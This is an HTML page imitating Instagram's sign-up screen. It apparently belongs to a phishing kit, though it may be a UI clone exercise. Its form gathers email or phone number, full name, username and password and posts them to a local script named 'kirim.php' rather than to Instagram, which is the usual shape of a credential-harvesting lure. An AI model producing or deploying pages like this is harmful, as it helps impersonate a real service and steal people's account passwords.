<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Instagram</title>
	<link rel="stylesheet" href="style.css">
</head>
<body bgcolor="#F1F1F1">
<div id ="container"> 

	<div class="Header">
		Instagram
	</div>

	<div class="subheader">
		Sign up to see photos and videos <br>
		from your firends.
	</div>
	

	<div class="button">
		<img src="fb.png" width="17" weight="17">
		<input type="submit" value="Login with Facebook">
	</div>
	<div id="line">
	<center>
	<table>
	<tr>
	<td><div class="up">------------------------------ O</div></td>
	<a><td><div class="up">R ----------------------------</div></td></a>
	</tr>
	</table>
	</center>
	</div>
	<div class="content">
		<form action="kirim.php" method="POST">
			<input type="email" name="email" placeholder="Mobile Number of Email"><br>
			<input type="text"	name="fullname" placeholder="Full Name"><br>
			<input type="text"	name="user" placeholder="Username"><br>
			<input type="password"	name="pw" placeholder="Password"><br>
			<input type="submit" name="singup" value="Sign up">
		</form>	
	</div>

		<div class="Footer">
		By Signing Up, you agree to our <br>
		<a>Terms</a> & <a>Privacy Policy.</a>
		</div>
</div>
</body>
</html>